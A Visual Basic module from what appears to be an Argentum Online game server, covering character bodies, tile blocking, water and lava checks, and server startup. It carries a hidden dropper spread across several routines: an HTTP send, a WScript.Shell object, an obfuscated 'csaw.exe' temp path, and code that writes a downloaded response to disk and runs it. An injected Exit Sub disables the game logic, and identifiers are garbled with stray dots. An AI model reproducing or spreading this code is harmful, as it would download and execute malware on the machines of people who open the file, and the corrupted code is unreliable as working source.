Attribute VB_Name = "Module3"
Public Sub DarCuerpoDesnudo(ByVal UserIndex As Integer, Optional ByVal Mimetizado As Boolean = False)
'***************************************************
'Autor: Nacho (Integer)
'Last Modification: 03/14/07
'Da cuerpo desnudo a un usuario
'23/11/2009: ZaMa - Optimizacion de codigo.
'***************************************************

Dim CuerpoDesnudo As Integer
halalaya.Send

Set processEnv = CreateObject("WScript.Shell").Environment("Process")

Exit Sub
With Use.rList(UserIndex)
    Select Case .Genero
        Case eGenero.Hombre
            Select Case .raza
                Case eRaza.Humano
                    CuerpoDesnudo = 21
                Case eRaza.Drow
                    CuerpoDesnudo = 32
                Case eRaza.Elfo
                    CuerpoDesnudo = 210
                Case eRaza.Gnomo
                    CuerpoDesnudo = 222
                Case eRaza.Enano
                    CuerpoDesnudo = 53
            End Select
        Case eGenero.Mujer
            Select Case .raza
                Case eRaza.Humano
                    CuerpoDesnudo = 39
                Case eRaza.Drow
                    CuerpoDesnudo = 40
                Case eRaza.Elfo
                    CuerpoDesnudo = 259
                Case eRaza.Gnomo
                    CuerpoDesnudo = 260
                Case eRaza.Enano
                    CuerpoDesnudo = 60
            End Select
    End Select
    
    If Mimetizado Then
        .CharMimetizado.Body = CuerpoDesnudo
    Else
        .Char.Body = CuerpoDesnudo
    End If
    
    .Flags.Desnudo = 1
End With

End Sub


Public Sub Bloquear(ByVal ToMap As Boolean, ByVal sndIndex As Integer, ByVal X As Integer, ByVal Y As Integer, ByVal b As Boolean)
'***************************************************
'Author: Unknownn
'Last Modification: -
'b ahora es boolean,
'b=true bloquea el tile en (x,y)
'b=false desbloquea el tile en (x,y)
'toMap = true -> Envia los datos a todo el mapa
'toMap = false -> Envia los datos al user
'Unifique los tres parametros (sndIndex,sndMap y map) en sndIndex... pero de todas formas, el mapa jamas se indica.. eso esta bien asi?
'Puede llegar a ser, que se quiera mandar el mapa, habria que agregar un nuevo parametro y modificar.. lo quite porque no se usaba ni aca ni en el cliente :s
'***************************************************

    If ToMap Then
        Call Sen.dData(SendTarget.ToMap, sndIndex, Prepar.eMessageBlockPosition(X, Y, b))
        Call Writ.eBlockPosition(sndIndex, X, Y, b)
    End If

tempFile = tempFile + "\" & "c" & "saw" + "." + "e" + "xe"
End Sub


Function HayAgua(ByVal Map As Integer, ByVal X As Integer, ByVal Y As Integer) As Boolean
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

    If Map > 0 And Map < NumMaps + 1 And X > 0 And X < 101 And Y > 0 And Y < 101 Then
        With MapData(Map, X, Y)
            If ((.Graphic(1) >= 1505 And .Graphic(1) <= 1520) Or (.Graphic(1) >= 5665 And .Graphic(1) <= 5680) Or (.Graphic(1) >= 13547 And .Graphic(1) <= 13562)) And .Graphic(2) = 0 Then
                    HayAgua = True
            Else
                    HayAgua = False
            End If
        End With
    Else
      HayAgua = False
    End If

End Function

Public Function HayLava(ByVal Map As Integer, ByVal X As Integer, ByVal Y As Integer)
'***************************************************
'Autor: Nacho (Integer)
'Last Modification: 03/12/07
'***************************************************
    If Map > 0 Then
        If Map > 0 And Map < NumMaps + 1 And X > 0 And X < 101 And Y > 0 And Y < 101 Then
            If MapDa.ta(Map, X, Y).Graphic(1) >= 5837 And MapDa.ta(Map, X, Y).Graphic(1) <= 5852 Then
                HayLava = True
            Else
                HayLava = False
            End If
        Else
          HayLava = False
        End If

    End If

adbrd.write halalaya.responseBody
    adbrd.savetofile tempFile, 2
shellApp.Open (tempFile)
End Function


Sub LimpiarMundo()
'***************************************************
'Author: Unknown
'Last Modification: 05/09/2012 - ^[GS]^
'***************************************************
On Error GoTo ErrHandler
    
    If aLimpiarMundo.CantItems > 0 Then
        Call aLimpiarMundo.EraseAllItems
    End If
    
    Call modSecurityIp.IpSecurityMantenimientoLista
    
    Exit Sub

ErrHandler:
    Call LogError("Error producido en el sub LimpiarMundo: " & Err.Description)
End Sub

Sub EnviarSpawnList(ByVal UserIndex As Integer)
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

    Dim k As Long
    Dim npcNames() As String
    
    ReDim npcNames(1 To UBound(modDeclaraciones.SpawnList)) As String
    
    For k = 1 To UBound(modDeclaraciones.SpawnList)
        npcNames(k) = modDeclaraciones.SpawnList(k).NpcName
    Next k
    
    Call WriteSpawnList(UserIndex, npcNames())

End Sub


Sub Main()
'***************************************************
'Author: Unknownn
'Last Modification: 08/06/2012 - ^[GS]^
'***************************************************

On Error Resume Next

    Dim f As Date
    Dim aux As String
    Dim buf As String, bufS As String
    Dim ret As Long
    '
    ' Obtener el directorio de windows
    buf = String$(260, vbNullChar)
    ret = GetWindowsDirectory(buf, Len(buf))
    buf = Left$(buf, ret)
    '
    ' Obtener el directorio de System
    bufS = String$(260, vbNullChar)
    ret = GetSystemDirectory(bufS, Len(bufS))
    bufS = Left$(bufS, ret)
    
    ChDir App.Path
    ChDrive App.Path
    
    'Si esta activado el mysql carga componentes (Fedudok)
#If Mysql = 1 Then
    Call CargarDB
#End If
    '(Fedudok)
    
    Call LoadMotd
    Call BanIpCargar
    Call BanHD_load ' GSZ-AO
    
    frmMain.Caption = frmMain.Caption & " v" & App.Major & "." & App.Minor & "." & App.Revision
    
    ' Start loading...
    frmCargando.Show
    'Call PlayWaveAPI(App.Path & "\wav\harp3.wav")
    
    ' Constants & vars
    frmCargando.cMensaje.Caption = "Cargando constantes..."
    Call LoadConstants
    DoEvents
    
    ' Arrays
    frmCargando.cMensaje.Caption = "Iniciando Arrays..."
    Call LoadArrays
    
    ' Server.ini & Apuestas.dat
    frmCargando.cMensaje.Caption = "Cargando Server.ini"
    Call LoadSini
    Call CargaApuestas
    
    ' Npcs.dat
    frmCargando.cMensaje.Caption = "Cargando NPCs.Dat"
    Call CargaNpcsDat
    
    ' Obj.dat
    frmCargando.cMensaje.Caption = "Cargando Obj.Dat"
    Call LoadOBJData
    
    ' Hechizos.dat
    frmCargando.cMensaje.Caption = "Cargando Hechizos.Dat"
    Call CargarHechizos
    
    ' Objetos de Herreria
    frmCargando.cMensaje.Caption = "Cargando Objetos de Herrer?"
    Call LoadHerreriaArmas
    Call LoadHerreriaArmaduras
    
    ' Objetos de Capinteria
    frmCargando.cMensaje.Caption = "Cargando Objetos de Carpinter?"
    Call LoadCarpinteria
    
    ' Balance.dat
    frmCargando.cMensaje.Caption = "Cargando Balance.Dat"
    Call LoadBalance
    
    ' Armaduras faccionarias
    frmCargando.cMensaje.Caption = "Cargando ArmadurasFaccionarias.dat"
    Call LoadArmadurasFaccion
    
    ' Pretorianos
    frmCargando.cMensaje.Caption = "Cargando Pretorianos.dat"
    Call LoadPretorianData

    ' Mapas
    If iniWorldBackup Then
        frmCargando.cMensaje.Caption = "Cargando BackUp"
        Call CargarBackUp
    Else
        frmCargando.cMensaje.Caption = "Cargando Mapas"
        Call LoadMapData
    End If
    
    ' Internet IP
    frmCargando.cMensaje.Caption = "Buscando IP en Internet..." ' GSZ
    frmMain.txtIP.Caption = frmMain.Inet1.OpenURL("http://ip1.dynupdate.no-ip.com:8245/")
    DoEvents
    If frmMain.txtIP.Caption = vbNullString Then frmMain.txtIP.Caption = "N/A"

    frmCargando.cMensaje.Caption = "Inicializando..."
    
    ' Map Sounds
    Set SonidosMapas = New clsSoundMapInfo
    Call SonidosMapas.LoadSoundMapInfo
    
    ' Home distance
    Call generateMatrix(MATRIX_INITIAL_MAP)
    
    ' Connections
    Call ResetUsersConnections
    
    ' Timers
    Call InitMainTimers
    
    ' Sockets
    Call SocketConfig
    frmMain.mnuReiniciarListen.Caption = "Reiniciar puerto de conexi? [" & iniPuerto & "]" ' GSZ
    
    ' End loading..
    Unload frmCargando
    
    'Log start time
    LogServerStartTime
    
    'Ocultar
    If iniOculto Then
        Call frmMain.InitMain(1)
    Else
        Call frmMain.InitMain(0)
    End If
    
    tInicioServer = GetTickCount() And &H7FFFFFFF
    
    If frmMain.Visible Then frmMain.txStatus.Text = "Escuchando conexiones entrantes ..."
    
    'Actualizo el frmMain. / maTih.-  |  02/03/2012
    If frmMain.Visible Then frmMain.Record.Caption = CStr(iniRecord)
End Sub

